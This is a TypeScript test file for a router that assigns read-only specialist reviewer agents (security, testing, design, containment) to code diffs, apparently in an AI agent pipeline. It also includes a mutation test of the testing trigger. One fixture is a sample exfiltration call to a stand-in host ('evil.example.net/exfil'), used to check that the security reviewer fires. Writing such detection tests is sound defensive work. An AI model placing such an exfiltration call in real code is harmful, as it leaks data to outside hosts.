import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { readFileSync } from "node:fs";
import { test } from "node:test";
import { skipInMutationSandbox } from "./helpers/mutation-sandbox.js";
import {
  anySpecialistConcern,
  buildSpecialistCommentArgs,
  buildSpecialistSpawnArgs,
  containmentTrigger,
  designTrigger,
  isReadOnlyToolset,
  parseSpecialistVerdict,
  renderSpecialistPanelComment,
  routeSpecialists,
  securityTrigger,
  SPECIALIST_TOOLS,
  taskMetadataFromPrinciples,
  TDD_STRICT_TRIGGER_DETERMINATION,
  testingTrigger,
  type SpecialistName,
  type SpecialistPanelInput,
} from "../src/lib/specialist-panel.js";
import type { DiffSummary } from "../src/lib/risk-score.js";
import type { Mount } from "../src/lib/mounts.js";
import { writeMutantModule } from "./helpers/mutant-module.js";

function diffOf(...files: { path: string; content?: string }[]): DiffSummary {
  return { files: files.map((f) => ({ path: f.path, additions: 1, deletions: 0, content: f.content })) };
}

const MOUNT: Mount = { model: "sonnet", effort: "medium", maxTurns: 20, contextBudget: 100_000 };

// ── Acceptance criterion 1: egress to a new domain -> security, NOT design ──

test("routeSpecialists: a diff adding a network call to a new domain triggers security and NOT design", () => {
  const diff = diffOf({
    path: "src/lib/vendor-client.ts",
    content: `export async function ping() { return fetch("https://api.new-vendor.example.com/v1/ping"); }`,
  });
  const triggers = routeSpecialists({ diff });
  const names = triggers.map((t) => t.specialist);
  assert.ok(names.includes("security"), `expected security in ${JSON.stringify(names)}`);
  assert.ok(!names.includes("design"), `expected design NOT triggered, got ${JSON.stringify(names)}`);
  assert.ok(!names.includes("testing"));
  assert.ok(!names.includes("containment"));
});

test("securityTrigger: fires directly on a raw network-call diff", () => {
  const diff = diffOf({ path: "src/lib/x.ts", content: `axios.get("https://evil.example.net/exfil")` });
  const trigger = securityTrigger(diff);
  assert.equal(trigger?.specialist, "security");
});

// ── Acceptance criterion 2: docs-only diff -> zero specialists ─────────────

test("routeSpecialists: a docs-only diff triggers NO specialist", () => {
  const diff = diffOf({ path: "docs/guide.md", content: "# Guide\n\nSome prose about the feature." });
  const triggers = routeSpecialists({ diff });
  assert.deepEqual(triggers, []);
});

test("routeSpecialists: a docs-only diff with a critical risk band still routes to containment ONLY (backstop, not a false security/testing/design fire)", () => {
  const diff = diffOf({ path: "docs/guide.md" });
  const triggers = routeSpecialists({ diff, riskBand: "critical" });
  assert.deepEqual(
    triggers.map((t) => t.specialist),
    ["containment"],
  );
});

// ── The four specialist triggers, individually ─────────────────────────────

test("containmentTrigger: fires on hooks/, settings, sandbox, and .env paths", () => {
  assert.equal(containmentTrigger(diffOf({ path: "hooks/deny-floor.sh" }))?.specialist, "containment");
  assert.equal(containmentTrigger(diffOf({ path: ".claude/settings.json" }))?.specialist, "containment");
  assert.equal(containmentTrigger(diffOf({ path: "settings/worker.json" }))?.specialist, "containment");
  assert.equal(containmentTrigger(diffOf({ path: ".env.production" }))?.specialist, "containment");
  assert.equal(containmentTrigger(diffOf({ path: "src/lib/sandbox-probe.ts" }))?.specialist, "containment");
  assert.equal(containmentTrigger(diffOf({ path: "README.md" })), null);
});

test("containmentTrigger: a critical risk band is a BACKSTOP even with no matching path (FIELD FINDING 10a)", () => {
  const trigger = containmentTrigger(diffOf({ path: "src/lib/unrelated.ts" }), "critical");
  assert.equal(trigger?.specialist, "containment");
  assert.match(trigger!.reason, /backstop/i);
});

test("containmentTrigger: a non-critical risk band is NOT a backstop", () => {
  assert.equal(containmentTrigger(diffOf({ path: "src/lib/unrelated.ts" }), "high"), null);
  assert.equal(containmentTrigger(diffOf({ path: "src/lib/unrelated.ts" }), "low"), null);
});

test("testingTrigger: fires on tdd:strict, negative coverage/mutation delta, or new untested paths", () => {
  assert.equal(testingTrigger(undefined), null);
  assert.equal(testingTrigger({})?.specialist ?? null, null);
  assert.equal(testingTrigger({ tddStrict: true })?.specialist, "testing");
  assert.equal(testingTrigger({ coverageDelta: -1 })?.specialist, "testing");
  assert.equal(testingTrigger({ coverageDelta: 1 }), null);
  assert.equal(testingTrigger({ mutationDelta: -0.5 })?.specialist, "testing");
  assert.equal(testingTrigger({ newCodePathsWithoutTests: true })?.specialist, "testing");
});

test("designTrigger: fires on task-declared layer-crossing or new abstraction, never diff-derived", () => {
  assert.equal(designTrigger(undefined), null);
  assert.equal(designTrigger({})?.specialist ?? null, null);
  assert.equal(designTrigger({ crossesLayerBoundary: true })?.specialist, "design");
  assert.equal(designTrigger({ addsAbstraction: true })?.specialist, "design");
});

test("routeSpecialists: order is fixed (security, testing, design, containment) and multiple triggers can co-fire", () => {
  const input: SpecialistPanelInput = {
    diff: diffOf({ path: "hooks/deny-floor.sh" }, { path: "package.json" }),
    task: { tddStrict: true, crossesLayerBoundary: true },
  };
  const triggers = routeSpecialists(input);
  assert.deepEqual(
    triggers.map((t) => t.specialist),
    ["security", "testing", "design", "containment"],
  );
});

test("routeSpecialists: deterministic — the same input always yields the same set", () => {
  const input: SpecialistPanelInput = { diff: diffOf({ path: "package-lock.json" }) };
  const a = routeSpecialists(input);
  const b = routeSpecialists(input);
  assert.deepEqual(a, b);
});

// ── Acceptance criterion 3: specialists are read-only and only advise ─────

test("SPECIALIST_TOOLS carries no write-capable tool", () => {
  assert.ok(isReadOnlyToolset(SPECIALIST_TOOLS));
  for (const write of ["Write", "Edit", "NotebookEdit", "MultiEdit"]) {
    assert.ok(!SPECIALIST_TOOLS.includes(write), `SPECIALIST_TOOLS must not include ${write}`);
  }
});

test("isReadOnlyToolset: false the moment any write tool is present", () => {
  assert.equal(isReadOnlyToolset(["Read", "Grep"]), true);
  assert.equal(isReadOnlyToolset(["Read", "Write"]), false);
  assert.equal(isReadOnlyToolset(["Bash", "Edit"]), false);
});

test("buildSpecialistSpawnArgs: every specialist's real spawn carries ONLY the read-only tool list", () => {
  const specialists: SpecialistName[] = ["security", "testing", "design", "containment"];
  for (const specialist of specialists) {
    const args = buildSpecialistSpawnArgs({
      input: { specialist, taskId: "W2-T1", prUrl: "https://github.com/x/y/pull/1", triggers: [] },
      mount: MOUNT,
      cwd: "/tmp/whatever",
      settingsFile: "/tmp/settings.json",
    });
    assert.deepEqual(args.tools, SPECIALIST_TOOLS);
    assert.ok(isReadOnlyToolset(args.tools ?? []));
  }
});

test("buildSpecialistCommentArgs: posts a PR COMMENT, never a commit status/merge call", () => {
  const args = buildSpecialistCommentArgs("https://github.com/x/y/pull/1", "looks fine");
  assert.deepEqual(args, ["pr", "comment", "https://github.com/x/y/pull/1", "--body", "looks fine"]);
  assert.ok(!args.includes("api"));
  assert.ok(!args.some((a) => /status/i.test(a)));
  assert.ok(!args.some((a) => /merge/i.test(a)));
});

test("parseSpecialistVerdict: parses PASS/CONCERN + comments; unparseable output fails SAFE to pass (advisory, never a stall)", () => {
  const concern = parseSpecialistVerdict(
    "security",
    "SPECIALIST_VERDICT: CONCERN\nSPECIALIST_COMMENT: new egress to an unreviewed domain\n",
  );
  assert.equal(concern.state, "concern");
  assert.deepEqual(concern.comments, ["new egress to an unreviewed domain"]);

  const pass = parseSpecialistVerdict("testing", "SPECIALIST_VERDICT: PASS\n");
  assert.equal(pass.state, "pass");
  assert.deepEqual(pass.comments, []);

  const garbled = parseSpecialistVerdict("design", "the model rambled and emitted nothing parseable");
  assert.equal(garbled.state, "pass");
  assert.deepEqual(garbled.comments, []);
});

test("anySpecialistConcern / renderSpecialistPanelComment fold verdicts without deciding anything (advisory only)", () => {
  const verdicts = [
    { specialist: "security" as const, state: "pass" as const, comments: [] },
    { specialist: "containment" as const, state: "concern" as const, comments: ["settings typo risk"] },
  ];
  assert.equal(anySpecialistConcern(verdicts), true);
  assert.equal(anySpecialistConcern([{ specialist: "design", state: "pass", comments: [] }]), false);

  const rendered = renderSpecialistPanelComment(verdicts);
  assert.match(rendered, /security.*PASS/i);
  assert.match(rendered, /containment.*CONCERN/i);
  assert.match(rendered, /settings typo risk/);
});

// ── W1-T948: the tdd:strict testing trigger is reachable from production ──
//
// Recon (plan/tasks.d/W1-T948-*.yaml) found TWO things wrong: `testingTrigger`
// branched on a field (`tddStrict`) nothing in src/ ever assigned, AND
// `routeSpecialists` itself had no production caller at all — a builder who
// only populated the field would still ship a path nothing reaches, with a
// green test hiding it. The determination recorded below is POPULATE: the
// field mirrors review.ts's own `isTddStrict` gate read, so it stays; what
// was missing was `taskMetadataFromPrinciples` (the builder) and
// run-task.ts's call through it (the caller). Both are proven here.

test("W1-T948: the determination between populating and removing is recorded", () => {
  // POPULATE, not REMOVE: `tddStrict` mirrors review.ts's `isTddStrict` gate
  // read (the same `principles: {tdd: strict}` property), and the testing
  // rubric already promises to flag an unreproducible red->green claim —
  // exactly what a tdd:strict task declares. Removing it would delete a
  // signal the module's own design (§4B) names on purpose. The missing piece
  // was a production CALLER, supplied below, not the field itself.
  assert.equal(TDD_STRICT_TRIGGER_DETERMINATION, "populate");
});

test("W1-T948: the testing trigger fires from production-constructed metadata", () => {
  // `taskMetadataFromPrinciples` is the SAME builder run-task.ts calls with a
  // real task's `principles` — not a hand-built `{ tddStrict: true }` literal.
  const metadata = taskMetadataFromPrinciples({ tdd: "strict" });
  assert.equal(testingTrigger(metadata)?.specialist, "testing");
});

test("W1-T948: a task without the declaration does not fire the testing trigger", () => {
  // Same run as the positive case above: a task whose `principles` never
  // declare `tdd: strict` (a different value, or no `principles` at all)
  // must NOT fire — the negative control the recon record required.
  assert.equal(testingTrigger(taskMetadataFromPrinciples({ tdd: "encouraged" })), null);
  assert.equal(testingTrigger(taskMetadataFromPrinciples(undefined)), null);
});

// SKIPPED INSIDE STRYKER'S SANDBOX (skipInMutationSandbox): this reads its own module's source
// off disk and asserts the substitution target occurs EXACTLY ONCE. In the sandbox that path
// resolves to an INSTRUMENTED copy — the literal is gone and the count reads 0 — which is the
// wrong question, not a failing answer. It still runs on the real tree under `ci`.
test("W1-T948: removing the assignment fails the positive test", skipInMutationSandbox(), async () => {
  // Mutating the SOURCE proves the positive test above is carried by the
  // assignment under test, not by some neighbouring accident (a no-op
  // mutation would be indistinguishable from a surviving mutant by result
  // alone). The substitution target is asserted UNIQUE first.
  const specialistPanelUrl = new URL("../src/lib/specialist-panel.ts", import.meta.url);
  const src = readFileSync(specialistPanelUrl, "utf8");
  const target = "return { tddStrict: isTddStrict(principles) };";
  const occurrences = src.split(target).length - 1;
  assert.equal(occurrences, 1, "the substitution target must be UNIQUE or the mutant proves nothing");

  // The file-sha check, read either side of the mutation (design item (iv)):
  // the ORIGINAL content's sha must differ from the MUTATED content's sha —
  // otherwise the substitution silently failed to apply and nothing below
  // would be measuring the assignment at all.
  const originalSha = createHash("sha256").update(src).digest("hex");
  const mutatedSrc = src.replace(target, "return {};");
  const mutatedSha = createHash("sha256").update(mutatedSrc).digest("hex");
  assert.notEqual(mutatedSha, originalSha, "the mutation must actually change the file content");

  // The copy lives under test/ (writeMutantModule), never os.tmpdir() — a
  // copy outside the project root re-enters the real src/lib graph and
  // destroys the coverage record of modules this suite never mentions
  // (test/helpers/mutant-module.ts carries the measurement).
  const mutantPath = writeMutantModule("specialist-panel.ts", mutatedSrc);
  const mutant = (await import(mutantPath)) as typeof import("../src/lib/specialist-panel.js");
  const mutantMetadata = mutant.taskMetadataFromPrinciples({ tdd: "strict" });
  assert.equal(
    mutant.testingTrigger(mutantMetadata),
    null,
    "the mutant must fail to fire the testing trigger — otherwise this proves nothing",
  );

  // The real, on-disk file was never touched by the mutant copy: its sha
  // reads identical before and after the check ran.
  const shaAfter = createHash("sha256").update(readFileSync(specialistPanelUrl, "utf8")).digest("hex");
  assert.equal(shaAfter, originalSha, "the real file must read unchanged either side of the mutation check");

  // And the real, unmutated module still fires — the positive test this
  // mutant was verifying actually passes against the committed source.
  assert.equal(testingTrigger(taskMetadataFromPrinciples({ tdd: "strict" }))?.specialist, "testing");
});

test("W1-T948: the specialist router is reached from a production call path", () => {
  // run-task.ts must call routeSpecialists through taskMetadataFromPrinciples
  // — the SAME builder tested above — not through a hand-built test literal.
  const runTaskSrc = readFileSync(new URL("../src/run-task.ts", import.meta.url), "utf8");
  assert.match(
    runTaskSrc,
    /routeSpecialists\(\s*\{\s*diff:\s*\{\s*files:\s*\[\]\s*\},\s*task:\s*taskMetadataFromPrinciples\(task\.principles\)/,
    "run-task.ts must reach routeSpecialists via taskMetadataFromPrinciples(task.principles), " +
      "not a hand-built metadata literal",
  );
  // And the SAME builder-constructed input functionally reaches the trigger
  // — the call path is real, not merely textually present.
  const triggers = routeSpecialists({ diff: { files: [] }, task: taskMetadataFromPrinciples({ tdd: "strict" }) });
  assert.deepEqual(
    triggers.map((t) => t.specialist),
    ["testing"],
  );
});
